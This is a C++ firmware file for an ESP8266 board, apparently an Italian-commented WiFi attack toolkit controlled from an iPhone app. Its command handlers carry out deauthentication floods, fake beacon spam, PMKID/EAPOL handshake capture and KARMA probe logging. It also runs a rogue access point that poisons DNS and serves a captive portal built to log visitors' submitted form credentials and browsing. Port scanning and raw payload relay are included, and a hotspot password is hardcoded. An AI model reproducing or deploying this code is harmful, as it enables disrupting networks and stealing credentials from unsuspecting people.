// RedHatSec Bridge 8266 v3 — STA-only, active scan async, TX buffered
//
//   iPhone --TCP:3333--> ESP8266 (STA su hotspot iPhone)
//
//   Protocollo RHS (frame TX esp→app):
//     [0x5A][len_lo][len_hi][cmd][status][payload...][crc8(off1, 4+len)]
//
//   Protocollo RHS (frame RX app→esp):
//     [0xA5][len_lo][len_hi][rsvd][cmd][payload...][crc8(off1, 4+len)]
//
//   Cmd:
//     0x01 ping                         → "RHS-8266"
//     0x02 scan[sec]                    → [rssi][ch][bssid6][sec][ssidlen][ssid]*
//     0x03 wifiResults                  → stessi risultati di 0x02 (senza rescan)
//     0x04 deauth[mac6][ch][count]      → "deauth ok"
//     0x05 beacon[count][len][ssid]...  → armato (loop in background)
//     0x06 pmkid[mac6][ch]              → EAPOL raw (max 128B) o "no eapol"
//     0x07 stop                         → ferma beacon + pmkid
//     0x08 join[len][ssid][plen][pass]  → IP locale (stringa) o "join failed"
//     0x10 tcp_scan[ip4][count][port u16 xN] → [port u16][bannerLen][banner]*
//     0x11 tcp_roundtrip[ip4][port u16][tcs][plen u16][payload] → bytes
//     0x12 udp_roundtrip[ip4][port u16][tcs][plen u16][payload] → bytes

#include <ESP8266WiFi.h>
#include <WiFiUdp.h>
#include <user_interface.h>
#include <lwip/napt.h>   // ip_napt_enable: NAT reale per i client del rogue AP

// ============ CONFIG ============
const char *STA_SSID = "Hexxeted";
const char *STA_PASS = "lwae9180";
const uint16_t TCP_PORT = 3333;

// ============ STATO ============
WiFiServer server(TCP_PORT);
WiFiClient client;

uint8_t apChannel = 1;

uint8_t rxBuf[512];
int rxLen = 0;

uint8_t txBuf[1100];
int txLen = 0;
bool txPending = false;

bool scanPending = false;
uint32_t scanStart = 0;
bool joinPending = false;
uint32_t joinStart = 0;
String joinTargetSsid;

bool beaconActive = false;
uint8_t beaconSsids[16][33];
int beaconSsidLens[16];
int beaconCount = 0;
uint8_t beaconChannel = 6;

bool pmkidArmed = false;
uint32_t pmkidStart = 0;
uint32_t pmkidReturnAt = 0;
bool pmkidAwaitingReturn = false;
uint8_t pmkidTarget[6];
uint8_t pmkidTargetCh = 1;
uint8_t pmkidBuf[128];
int pmkidLen = 0;
bool pmkidCaptured = false;

struct APEntry { uint8_t bssid[6]; uint8_t ch; int8_t rssi; char ssid[33]; uint8_t sec; };
APEntry aps[24];
int apCount = 0;

// ============ rogue AP (PineApple) ============
bool rogue = false;
char rogueSsid[33];
uint8_t roguePass[65];
uint8_t roguePassLen = 0;
bool dnsPoison = false;
char portalPage[800];
int portalLen = 0;
bool karmaArmed = false;
String probeSsids[24];
int probeCount = 0;

// sniffing traffico client: DNS qname + HTTP portal (form = credenziali)
String sniffLog[20];
int sniffCount = 0;
bool dnsFwd = false;
IPAddress dnsClientIP;
uint16_t dnsClientPort = 0;
bool dnsPending = false;
uint32_t dnsPendingAt = 0;

void sniffPush(const String &s) {
  for (int k = 0; k < sniffCount; k++) if (sniffLog[k] == s) return;
  if (sniffCount < 20) { sniffLog[sniffCount++] = s; return; }
  for (int k = 1; k < 20; k++) sniffLog[k - 1] = sniffLog[k];
  sniffLog[19] = s;
}

WiFiUDP dnsSrv;
WiFiServer portalSrv(80);

// ============ crc8 ============
uint8_t crc8(const uint8_t *d, int n) {
  uint8_t crc = 0;
  for (int i = 0; i < n; i++) {
    crc ^= d[i];
    for (int b = 0; b < 8; b++)
      crc = (crc & 0x80) ? (uint8_t)((crc << 1) ^ 0x07) : (uint8_t)(crc << 1);
  }
  return crc;
}

// ============ TX con buffer offline ============
void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len) {
  uint8_t f[1024];
  int i = 0;
  f[i++] = 0x5A;
  f[i++] = len & 0xFF;
  f[i++] = (len >> 8) & 0xFF;
  f[i++] = cmdEcho;
  f[i++] = status;
  if (len > 1000) len = 1000;
  if (len > 0) { memcpy(f + i, payload, len); i += len; }
  f[i++] = crc8(f + 1, 4 + len);

  if (client && client.connected()) {
    client.write(f, i);
    client.flush();
  } else {
    if (i <= (int)sizeof(txBuf)) {
      memcpy(txBuf, f, i);
      txLen = i;
      txPending = true;
    }
  }
  Serial.printf("[TX] cmd=0x%02X st=0x%02X len=%d%s\n",
                cmdEcho, status, len, (client && client.connected()) ? "" : " (buffered)");
}

// ============ PMKID sniffer ============
void snifferCb(uint8_t *buf, uint16_t len) {
  // karma: probe request (fc 0x40/0x50) → SSID unici nella lista
  if (karmaArmed && !pmkidArmed && len > 26 && (buf[0] == 0x40 || buf[0] == 0x50)) {
    int o = 24;
    while (o + 2 <= len && o < 220) {
      uint8_t eid = buf[o], el = buf[o + 1];
      if (eid == 0 && el > 0 && el <= 32) {
        bool dup = false;
        for (int k = 0; k < probeCount; k++)
          if (probeSsids[k].length() == el && memcmp(probeSsids[k].c_str(), buf + o + 2, el) == 0) { dup = true; break; }
        if (!dup && probeCount < 24) {
          char t[33]; memcpy(t, buf + o + 2, el); t[el] = 0;
          probeSsids[probeCount++] = String(t);
          Serial.printf("[karma] probe %s\n", t);
        }
        break;
      }
      o += 2 + el;
    }
    return;
  }
  if (!pmkidArmed || len < 40) return;
  uint8_t *d = buf;
  int lim = (len > 160) ? 160 : len;
  for (int i = 0; i + 8 <= lim; i++) {
    if (d[i] == 0xAA && d[i+1] == 0xAA && d[i+2] == 0x03 && d[i+3] == 0x00 &&
        d[i+4] == 0x00 && d[i+5] == 0x00 && d[i+6] == 0x88 && d[i+7] == 0x8E) {
      bool match = false;
      for (int a = 4; a + 6 <= 36 && a + 6 <= len; a++)
        if (memcmp(d + a, pmkidTarget, 6) == 0) { match = true; break; }
      if (!match) return;
      pmkidLen = (len < 128) ? len : 128;
      memcpy(pmkidBuf, d, pmkidLen);
      pmkidCaptured = true;
      Serial.println("[pmkid] EAPOL");
      return;
    }
  }
}

// ============ TX raw 802.11 ============
void sendDeauth(const uint8_t bssid[6], uint8_t ch, int count) {
  wifi_set_channel(ch);
  delay(5);

  uint8_t pkt[26];
  pkt[0] = 0xC0; pkt[1] = 0x00;
  pkt[2] = 0x00; pkt[3] = 0x00;
  for (int k = 0; k < 6; k++) pkt[4 + k] = 0xFF;
  memcpy(pkt + 10, bssid, 6);
  memcpy(pkt + 16, bssid, 6);
  pkt[22] = 0xF0; pkt[23] = 0xFF;
  pkt[24] = 0x07; pkt[25] = 0x00;
  for (int n = 0; n < count; n++) {
    wifi_send_pkt_freedom(pkt, 26, false);
    delay(8);
  }

  wifi_set_channel(apChannel);
  Serial.printf("[deauth] %02X:%02X:%02X:%02X:%02X:%02X ch%d x%d\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ch, count);
}

void buildBeacon(uint8_t *pkt, int *len, const uint8_t *ssid, int ssidLen,
                 const uint8_t bssid[6], uint8_t ch) {
  int i = 0;
  pkt[i++] = 0x80; pkt[i++] = 0x00;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  for (int k = 0; k < 6; k++) pkt[i++] = 0xFF;
  memcpy(pkt + i, bssid, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  for (int k = 0; k < 8; k++) pkt[i++] = 0x00;
  pkt[i++] = 0x64; pkt[i++] = 0x00;
  pkt[i++] = 0x01; pkt[i++] = 0x04;
  pkt[i++] = 0x00; pkt[i++] = (uint8_t)ssidLen;
  memcpy(pkt + i, ssid, ssidLen); i += ssidLen;
  pkt[i++] = 0x01; pkt[i++] = 0x08;
  const uint8_t rates[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  memcpy(pkt + i, rates, 8); i += 8;
  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = ch;
  *len = i;
}

void beaconLoop() {
  uint8_t pkt[128];
  for (int n = 0; n < beaconCount && beaconActive; n++) {
    uint8_t bssid[6] = {0x02, (uint8_t)random(256), (uint8_t)random(256),
                        (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)};
    int len = 0;
    buildBeacon(pkt, &len, beaconSsids[n], beaconSsidLens[n], bssid, beaconChannel);
    for (int rep = 0; rep < 3; rep++) wifi_send_pkt_freedom(pkt, len, false);
    delay(40);
  }
}

// ============ scan ============
void startScan(int seconds) {
  if (seconds < 3) seconds = 3;
  if (seconds > 12) seconds = 12;
  if (scanPending) return;
  WiFi.scanDelete();
  if (WiFi.scanNetworks(true, true) == WIFI_SCAN_RUNNING) {
    scanPending = true;
    scanStart = millis();
    Serial.println("[scan] started async");
  }
}

void pollScan() {
  if (!scanPending) return;
  int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING) {
    if (millis() - scanStart > 15000) {
      scanPending = false;
      WiFi.scanDelete();
      sendFrame(0x02, 0x02, (const uint8_t *)"scan timeout", 12);
    }
    return;
  }
  scanPending = false;
  apCount = 0;
  if (n > 0) {
    for (int k = 0; k < n && apCount < 24; k++) {
      APEntry &e = aps[apCount];
      memset(&e, 0, sizeof(e));
      e.rssi = (int8_t)WiFi.RSSI(k);
      e.ch   = (uint8_t)WiFi.channel(k);
      const uint8_t *b = WiFi.BSSID(k);
      if (b) memcpy(e.bssid, b, 6);
      e.sec  = (uint8_t)WiFi.encryptionType(k);
      String s = WiFi.SSID(k);
      int sl = s.length(); if (sl > 32) sl = 32;
      memcpy(e.ssid, s.c_str(), sl); e.ssid[sl] = 0;
      apCount++;
    }
  }
  WiFi.scanDelete();

  uint8_t payload[900];
  int i = 0;
  for (int k = 0; k < apCount && i < 880; k++) {
    payload[i++] = (uint8_t)aps[k].rssi;
    payload[i++] = aps[k].ch;
    memcpy(payload + i, aps[k].bssid, 6); i += 6;
    payload[i++] = aps[k].sec;
    int sl = strlen(aps[k].ssid);
    if (sl > 32) sl = 32;
    payload[i++] = (uint8_t)sl;
    memcpy(payload + i, aps[k].ssid, sl); i += sl;
  }
  Serial.printf("[scan] %d AP\n", apCount);
  sendFrame(0x02, 0x00, payload, i);
}

// ============ RX parser ============
void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen);

void feedRx(const uint8_t *d, int n) {
  for (int i = 0; i < n; i++) {
    if (rxLen == 0 && d[i] != 0xA5) continue;
    if (rxLen < (int)sizeof(rxBuf)) rxBuf[rxLen++] = d[i];
    if (rxLen >= 6) {
      int plen = rxBuf[1] | (rxBuf[2] << 8);
      int total = 6 + plen;
      if (rxLen >= total) {
        uint8_t cmd = rxBuf[4];
        if (crc8(rxBuf + 1, 4 + plen) == rxBuf[5 + plen]) {
          dispatchCmd(cmd, rxBuf + 5, plen);
        } else {
          sendFrame(cmd, 0x01, (const uint8_t *)"crcerr", 6);
        }
        rxLen = 0;
      }
    }
  }
}

// ============ rogue AP: DNS poison/forward + captive portal ============
void dnsTick() {
  if (!rogue) return;
  int ps = dnsSrv.parsePacket();
  if (ps <= 0) return;
  // risposta upstream in forward mode: porta sorgente 53
  if (dnsFwd && dnsSrv.remotePort() == 53) {
    if (dnsPending && millis() - dnsPendingAt > 4000) dnsPending = false;
    static uint8_t rp[512];
    int rn = dnsSrv.read(rp, sizeof(rp));
    if (dnsPending && rn > 0) {
      dnsSrv.beginPacket(dnsClientIP, dnsClientPort);
      dnsSrv.write(rp, rn);
      dnsSrv.endPacket();
      dnsPending = false;
    }
    return;
  }
  static uint8_t q[512];
  int n = dnsSrv.read(q, sizeof(q));
  if (n < 17) return;
  // QNAME (offset 12, label len-prefixed, stop su 0 o pointer 0xC0)
  String qn;
  int o = 12;
  while (o < n && q[o] > 0 && q[o] < 64 && o + 1 + q[o] <= n) {
    char lb[64];
    memcpy(lb, q + o + 1, q[o]);
    lb[q[o]] = 0;
    qn += lb;
    qn += '.';
    o += q[o] + 1;
  }
  if (qn.length() > 4) {
    qn.remove(qn.length() - 1);
    sniffPush("D:" + qn);
  }
  dnsClientIP = dnsSrv.remoteIP();
  dnsClientPort = dnsSrv.remotePort();
  Serial.printf("[dns] %s fwd=%d\n", qn.c_str(), dnsFwd);
  if (!dnsFwd) {
    // poison: tutte le A → 192.168.4.1 (captive portal + HTTP capture)
    q[2] = 0x85; q[3] = 0x80;
    q[6] = 0; q[7] = 1;
    static const uint8_t ans[16] = {0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01,
                                    0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 192, 168, 4, 1};
    dnsSrv.beginPacket(dnsClientIP, dnsClientPort);
    dnsSrv.write(q, n);
    dnsSrv.write(ans, sizeof(ans));
    dnsSrv.endPacket();
  } else {
    // forward al resolver dell'hotspot: internet reale + log qname
    IPAddress up = WiFi.dnsIP();
    if (up == IPAddress(0, 0, 0, 0)) return;
    dnsSrv.beginPacket(up, 53);
    dnsSrv.write(q, n);
    dnsSrv.endPacket();
    dnsPending = true;
    dnsPendingAt = millis();
  }
}

void portalTick() {
  if (!rogue) return;
  WiFiClient c = portalSrv.available();
  if (!c) return;
  uint32_t t0 = millis();
  String head;
  while (c.connected() && millis() - t0 < 2000) {
    while (c.available()) head += (char)c.read();
    if (head.indexOf("\r\n\r\n") >= 0) {
      // POST: aspetto il body completo (content-length, max 600B)
      int clIdx = head.indexOf("Content-Length:");
      if (clIdx < 0) clIdx = head.indexOf("content-length:");
      if (clIdx >= 0) {
        int cl = head.substring(clIdx + 15).toInt();
        if (cl > 0 && cl <= 600) {
          uint32_t t1 = millis();
          while (c.connected() && millis() - t1 < 1500) {
            while (c.available()) head += (char)c.read();
            if (head.length() >= head.indexOf("\r\n\r\n") + 4 + cl) break;
          }
        }
      }
      break;
    }
  }
  // capture: request line + Host + form body (credenziali in chiaro)
  int sp = head.indexOf(' ');
  String method = (sp > 0) ? head.substring(0, sp) : "?";
  String path = "";
  if (sp > 0) {
    int sp2 = head.indexOf(' ', sp + 1);
    if (sp2 > sp) path = head.substring(sp + 1, sp2);
  }
  int hi = head.indexOf("Host: ");
  String host = (hi >= 0) ? head.substring(hi + 6, head.indexOf("\r\n", hi)) : "";
  String body = (head.indexOf("\r\n\r\n") >= 0) ? head.substring(head.indexOf("\r\n\r\n") + 4) : "";
  String entry = method + " http://" + host + path;
  if (body.length() > 0 && body.length() < 300) entry += "  [" + body + "]";
  sniffPush("H:" + entry);
  Serial.printf("[portal] %s\n", entry.c_str());

  String page = (portalLen > 0) ? String(portalPage) :
    String("<html><body><h2>RHS Portal</h2><p>connessione acquisita dal bridge RedHatSec</p></body></html>");
  // ballo captive portal iOS/Android: redirect 302 alla pagina → il CNA poppa
  if (path != "/rhs") {
    c.print("HTTP/1.1 302 Found\r\nLocation: http://192.168.4.1/rhs\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
    c.stop();
    return;
  }
  String r = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\nContent-Length: ";
  r += page.length(); r += "\r\n\r\n"; r += page;
  c.print(r);
  c.stop();
}

// ============ dispatcher ============
void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
  Serial.printf("[RX] cmd=0x%02X plen=%d\n", cmd, plen);
  switch (cmd) {
    case 0x01:
      sendFrame(0x01, 0x00, (const uint8_t *)"RHS-8266", 8);
      break;

    case 0x02: {
      int seconds = plen > 0 ? pl[0] : 8;
      startScan(seconds);
      break;
    }

    case 0x03: {
      if (apCount > 0) {
        uint8_t payload[900];
        int i = 0;
        for (int k = 0; k < apCount && i < 880; k++) {
          payload[i++] = (uint8_t)aps[k].rssi;
          payload[i++] = aps[k].ch;
          memcpy(payload + i, aps[k].bssid, 6); i += 6;
          payload[i++] = aps[k].sec;
          int sl = strlen(aps[k].ssid);
          if (sl > 32) sl = 32;
          payload[i++] = (uint8_t)sl;
          memcpy(payload + i, aps[k].ssid, sl); i += sl;
        }
        sendFrame(0x03, 0x00, payload, i);
      } else {
        startScan(8);
      }
      break;
    }

    case 0x04:
      if (plen >= 8) {
        sendDeauth(pl, pl[6], pl[7]);
        sendFrame(0x04, 0x00, (const uint8_t *)"deauth ok", 9);
      } else {
        sendFrame(0x04, 0x02, (const uint8_t *)"bad args", 8);
      }
      break;

    case 0x05: {
      int p = 0;
      int cnt = plen > 0 ? pl[p++] : 0;
      if (cnt > 16) cnt = 16;
      beaconCount = 0;
      for (int k = 0; k < cnt && p < plen; k++) {
        int sl = pl[p++];
        if (p + sl > plen || sl > 32) break;
        memcpy(beaconSsids[beaconCount], pl + p, sl);
        beaconSsidLens[beaconCount] = sl;
        beaconCount++;
        p += sl;
      }
      if (beaconCount > 0) {
        wifi_set_channel(beaconChannel);
        beaconActive = true;
        Serial.printf("[beacon] armato x%d ch%d\n", beaconCount, beaconChannel);
        sendFrame(0x05, 0x00, (const uint8_t *)"armed", 5);
      } else {
        sendFrame(0x05, 0x02, (const uint8_t *)"bad args", 8);
      }
      break;
    }

    case 0x06:
      if (plen >= 7) {
        memcpy(pmkidTarget, pl, 6);
        pmkidTargetCh = pl[6];
        pmkidCaptured = false;
        pmkidLen = 0;
        pmkidArmed = true;
        pmkidStart = millis();
        wifi_set_channel(pmkidTargetCh);
        delay(5);
        wifi_promiscuous_enable(1);
        Serial.printf("[pmkid] armed %02X:%02X:%02X:%02X:%02X:%02X ch%d\n",
                      pmkidTarget[0], pmkidTarget[1], pmkidTarget[2],
                      pmkidTarget[3], pmkidTarget[4], pmkidTarget[5], pmkidTargetCh);
      } else {
        sendFrame(0x06, 0x02, (const uint8_t *)"bad args", 8);
      }
      break;

    case 0x07:
      if (beaconActive) {
        beaconActive = false;
        wifi_set_channel(apChannel);
      }
      if (pmkidArmed) {
        pmkidArmed = false;
        wifi_promiscuous_enable(0);
        wifi_set_channel(apChannel);
      }
      if (karmaArmed) {
        karmaArmed = false;
        wifi_promiscuous_enable(0);
      }
      sendFrame(0x07, 0x00, (const uint8_t *)"stopped", 7);
      break;

    case 0x08: {  // join — FIX: disconnect(false), no radio off, reset su fail
      int p = 0;
      if (plen < 2) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      int sl = pl[p++];
      if (p + sl > plen || sl > 32) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      char ssid[33]; memcpy(ssid, pl + p, sl); ssid[sl] = 0; p += sl;
      if (p >= plen) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      int pw = pl[p++];
      if (p + pw > plen || pw > 64) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      char pass[65]; memcpy(pass, pl + p, pw); pass[pw] = 0;

      wifi_promiscuous_enable(0);
      beaconActive = false;
      pmkidArmed = false;

      WiFi.disconnect(false);   // FIX: radio resta on, niente WIFI_OFF inutile
      delay(200);
      WiFi.mode(WIFI_STA);
      WiFi.begin(ssid, pass[0] ? pass : NULL);

      joinTargetSsid = String(ssid);
      joinPending = true;
      joinStart = millis();
      Serial.printf("[join] %s\n", ssid);
      break;
    }

    case 0x10: {
      IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
      int cnt = pl[4];
      if (cnt > 12) cnt = 12;
      uint8_t out[160];
      int oi = 0;
      uint32_t t0 = millis();
      for (int k = 0; k < cnt && millis() - t0 < 12000 && oi < 150; k++) {
        uint16_t port = pl[5 + k * 2] | (pl[6 + k * 2] << 8);
        WiFiClient c;
        if (c.connect(ip, port)) {
          out[oi++] = port & 0xFF;
          out[oi++] = port >> 8;
          int blIdx = oi++;
          delay(250);
          int bl = 0;
          while (c.available() && bl < 40) { out[oi++] = c.read(); bl++; }
          out[blIdx] = (uint8_t)bl;
          c.stop();
        }
      }
      sendFrame(0x10, 0x00, out, oi);
      break;
    }

    case 0x11: {
      IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
      uint16_t port = pl[4] | (pl[5] << 8);
      int tcs = pl[6];
      int plen = pl[7] | (pl[8] << 8);
      WiFiClient c;
      if (!c.connect(ip, port)) {
        sendFrame(0x11, 0x01, (const uint8_t *)"conn fail", 9);
        break;
      }
      c.write(pl + 9, plen);
      uint8_t resp[512];
      int rl = 0;
      uint32_t t0 = millis();
      while (millis() - t0 < (uint32_t)tcs * 100 && rl < 512) {
        while (c.available() && rl < 512) resp[rl++] = c.read();
        delay(15);
      }
      c.stop();
      sendFrame(0x11, 0x00, resp, rl);
      break;
    }

    case 0x12: {
      IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
      uint16_t port = pl[4] | (pl[5] << 8);
      int tcs = pl[6];
      int plen = pl[7] | (pl[8] << 8);
      WiFiUDP u;
      u.beginPacket(ip, port);
      u.write(pl + 9, plen);
      u.endPacket();
      uint8_t resp[512];
      int rl = 0;
      uint32_t t0 = millis();
      while (millis() - t0 < (uint32_t)tcs * 100) {
        int ps = u.parsePacket();
        if (ps > 0) {
          while (u.available() && rl < 512) resp[rl++] = u.read();
          break;
        }
        delay(20);
      }
      u.stop();
      sendFrame(0x12, rl > 0 ? 0x00 : 0x01, resp, rl);
      break;
    }

    case 0x13: {  // rogueStart[ssidLen][ssid][passLen][pass][dnsPoison] — AP+STA (il bridge resta su hotspot)
      int p = 0;
      if (plen < 2) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
      int sl = pl[p++];
      if (p + sl > plen || sl > 32) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
      memcpy(rogueSsid, pl + p, sl); rogueSsid[sl] = 0; p += sl;
      int pw = 0;
      if (p < plen) pw = pl[p++];
      if (p + pw > plen || pw > 64) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
      memcpy(roguePass, pl + p, pw); roguePassLen = pw; p += pw;
      dnsPoison = p < plen ? pl[p] != 0 : false;

      wifi_promiscuous_enable(0);
      karmaArmed = false;
      // AP+STA: softAP segue il canale dello STA → il bridge TCP (hotspot) sopravvive
      if (!WiFi.softAP(rogueSsid, pw ? (const char *)roguePass : NULL, apChannel)) {
        sendFrame(0x13, 0x02, (const uint8_t *)"softAP fail", 11);
        break;
      }
      delay(300);
      dnsSrv.stop();
      bool b53 = dnsSrv.begin(53);   // sempre: serve anche in forward mode
      portalSrv.stop();
      portalSrv.begin();
      rogue = true;
      sniffCount = 0;                        // log pulito a ogni rogue session
      ip_napt_enable((uint32_t)WiFi.localIP(), 1);   // internet passthrough per i client
      Serial.printf("[rogue] %s ch%d dns=%d napt=1 dns53=%d\n", rogueSsid, apChannel, dnsPoison, b53);
      sendFrame(0x13, 0x00, nullptr, 0);
      break;
    }

    case 0x14: {  // rogueStop
      rogue = false;
      dnsPoison = false;
      dnsFwd = false;
      dnsPending = false;
      sniffCount = 0;
      dnsSrv.stop();
      portalSrv.stop();
      ip_napt_enable((uint32_t)WiFi.localIP(), 0);
      WiFi.softAPdisconnect(true);
      delay(200);
      WiFi.mode(WIFI_STA);
      WiFi.begin(STA_SSID, STA_PASS);
      Serial.println("[rogue] stop → STA");
      sendFrame(0x14, 0x00, nullptr, 0);
      break;
    }

    case 0x15: {  // rogueClients → [cnt][mac6][ip4]*n
      if (!rogue) { sendFrame(0x15, 0x02, (const uint8_t *)"rogue off", 9); break; }
      struct station_info *st = wifi_softap_get_station_info();
      static uint8_t out[113];
      int oi = 0;
      int cnt = 0;
      for (struct station_info *s = st; s && cnt < 8 && oi < 104; s = STAILQ_NEXT(s, next)) {
        cnt++;
        memcpy(out + oi, s->bssid, 6); oi += 6;
        out[oi++] = (uint8_t)(s->ip.addr & 0xFF);
        out[oi++] = (uint8_t)((s->ip.addr >> 8) & 0xFF);
        out[oi++] = (uint8_t)((s->ip.addr >> 16) & 0xFF);
        out[oi++] = (uint8_t)((s->ip.addr >> 24) & 0xFF);
      }
      wifi_softap_free_station_info();
      static uint8_t out2[113];
      out2[0] = (uint8_t)cnt;
      memcpy(out2 + 1, out, oi);
      sendFrame(0x15, 0x00, out2, oi + 1);
      break;
    }

    case 0x16: {  // karma[on] — arm/disarm; disarm → CSV probe trovati
      if (plen < 1) { sendFrame(0x16, 0x02, (const uint8_t *)"bad args", 8); break; }
      if (pl[0]) {
        karmaArmed = true;
        probeCount = 0;
        wifi_promiscuous_enable(1);   // AP resta su, monitor sul canale corrente
        Serial.println("[karma] armed");
        sendFrame(0x16, 0x00, nullptr, 0);
      } else {
        karmaArmed = false;
        wifi_promiscuous_enable(0);
        String csv;
        for (int k = 0; k < probeCount; k++) {
          if (k) csv += ",";
          csv += probeSsids[k];
        }
        Serial.printf("[karma] stop %d probe\n", probeCount);
        sendFrame(0x16, 0x00, (const uint8_t *)csv.c_str(), csv.length());
      }
      break;
    }

    case 0x17: {  // portalSet[len u16][html] (max 780B)
      if (plen < 2) { sendFrame(0x17, 0x02, (const uint8_t *)"bad args", 8); break; }
      int l = pl[0] | (pl[1] << 8);
      if (2 + l > plen || l > 780) { sendFrame(0x17, 0x02, (const uint8_t *)"bad args", 8); break; }
      memcpy(portalPage, pl + 2, l);
      portalLen = l;
      sendFrame(0x17, 0x00, nullptr, 0);
      break;
    }

    case 0x18: {  // nat[on][dnsFwd] — NAPT passthrough internet + mode DNS (0=poison, 1=forward)
      if (plen < 2) { sendFrame(0x18, 0x02, (const uint8_t *)"bad args", 8); break; }
      ip_napt_enable((uint32_t)WiFi.localIP(), pl[0] ? 1 : 0);
      dnsFwd = pl[1] != 0;
      dnsPending = false;
      Serial.printf("[nat] %d dnsFwd=%d\n", pl[0], pl[1]);
      sendFrame(0x18, 0x00, nullptr, 0);
      break;
    }

    case 0x19: {  // sniffLog → CSV "D:qname|H:http" (DNS visitati + HTTP/form catturati)
      String csv;
      for (int k = 0; k < sniffCount; k++) {
        if (k) csv += "|";
        csv += sniffLog[k];
      }
      sendFrame(0x19, 0x00, (const uint8_t *)csv.c_str(), csv.length());
      break;
    }

    default:
      sendFrame(cmd, 0x03, (const uint8_t *)"unknown cmd", 11);
  }
}

// ============ setup ============
void setup() {
  Serial.begin(115200);
  Serial.setDebugOutput(false);
  pinMode(2, OUTPUT);
  digitalWrite(2, LOW);

  WiFi.persistent(false);
  WiFi.mode(WIFI_STA);
  WiFi.setAutoReconnect(false);
  WiFi.begin(STA_SSID, STA_PASS);
  Serial.printf("[STA] connecting to %s\n", STA_SSID);

  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - t0 < 30000) delay(200);

  if (WiFi.status() == WL_CONNECTED) {
    apChannel = WiFi.channel();
    Serial.printf("[STA] ok ip=%s ch=%d\n",
                  WiFi.localIP().toString().c_str(), apChannel);
  } else {
    Serial.println("[STA] FAIL — scan diagnostico…");
    WiFi.scanDelete();
    WiFi.scanNetworks(true, true);
    uint32_t t1 = millis();
    while (WiFi.scanComplete() == WIFI_SCAN_RUNNING && millis() - t1 < 8000) delay(100);
    int n = WiFi.scanComplete();
    if (n < 0) n = 0;
    Serial.printf("[STA] scan: %d reti\n", n);
    for (int k = 0; k < n && k < 15; k++) {
      Serial.printf("  - %s ch%d rssi%d enc%d%s\n",
                    WiFi.SSID(k).c_str(), WiFi.channel(k), WiFi.RSSI(k),
                    (int)WiFi.encryptionType(k),
                    WiFi.SSID(k) == STA_SSID ? "  <<<< TROVATA" : "");
    }
    WiFi.scanDelete();   // FIX: libera la RAM dopo lo scan diagnostico
  }

  wifi_set_promiscuous_rx_cb(snifferCb);

  server.begin();
  server.setNoDelay(true);
  Serial.printf("[RHS-8266 v3] TCP :%u pronto\n", TCP_PORT);
}

// ============ loop ============
void loop() {
  if (!client || !client.connected()) {
    if (client) client.stop();
    client = server.available();
    if (client) {
      client.setNoDelay(true);
      Serial.printf("[bridge] client %s\n", client.remoteIP().toString().c_str());
      if (txPending) {
        client.write(txBuf, txLen);
        client.flush();
        txPending = false;
        Serial.printf("[bridge] flush %d byte bufferizzati\n", txLen);
      }
    }
  }

  int avail;
  while (client && client.connected() && (avail = client.available()) > 0) {
    uint8_t buf[128];
    int n = client.read(buf, sizeof(buf));
    if (n > 0) feedRx(buf, n);
  }

  pollScan();

  // rogue AP: DNS poison + captive portal
  dnsTick();
  portalTick();

  // join async — FIX: su timeout reset esplicito a STA_SSID (niente reconnect al target morto)
  if (joinPending) {
    if (WiFi.status() == WL_CONNECTED && WiFi.SSID() == joinTargetSsid) {
      joinPending = false;
      apChannel = WiFi.channel();
      String ips = WiFi.localIP().toString();
      sendFrame(0x08, 0x00, (const uint8_t *)ips.c_str(), ips.length());
    } else if (millis() - joinStart > 15000) {
      joinPending = false;
      WiFi.disconnect(false);
      WiFi.begin(STA_SSID, STA_PASS);   // riporta a casa subito
      sendFrame(0x08, 0x02, (const uint8_t *)"join failed", 11);
      Serial.println("[join] FAIL → reset STA_SSID");
    }
  }

  // manual reconnect — FIX: begin(STA_SSID), non reconnect() al target morto
  static uint32_t lastReconnect = 0;
  if (!joinPending && !pmkidArmed && !beaconActive &&
      WiFi.status() != WL_CONNECTED && millis() - lastReconnect > 10000) {
    lastReconnect = millis();
    WiFi.begin(STA_SSID, STA_PASS);
  }
  if (WiFi.status() == WL_CONNECTED) {
    int ch = WiFi.channel();
    if (ch > 0 && apChannel != (uint8_t)ch) apChannel = (uint8_t)ch;
  }

  if (beaconActive) beaconLoop();

  if (pmkidArmed && (pmkidCaptured || millis() - pmkidStart > 25000)) {
    pmkidArmed = false;
    wifi_promiscuous_enable(0);
    wifi_set_channel(apChannel);
    pmkidReturnAt = millis() + 3000;
    pmkidAwaitingReturn = true;
    Serial.println("[pmkid] return to AP channel");
  }

  if (pmkidAwaitingReturn && millis() >= pmkidReturnAt) {
    pmkidAwaitingReturn = false;
    if (pmkidCaptured) sendFrame(0x06, 0x00, pmkidBuf, pmkidLen);
    else              sendFrame(0x06, 0x02, (const uint8_t *)"no eapol", 8);
  }

  if (client && client.connected()) {
    digitalWrite(2, LOW);
  } else {
    digitalWrite(2, (millis() / 600) % 2 ? LOW : HIGH);
  }

  delay(1);
}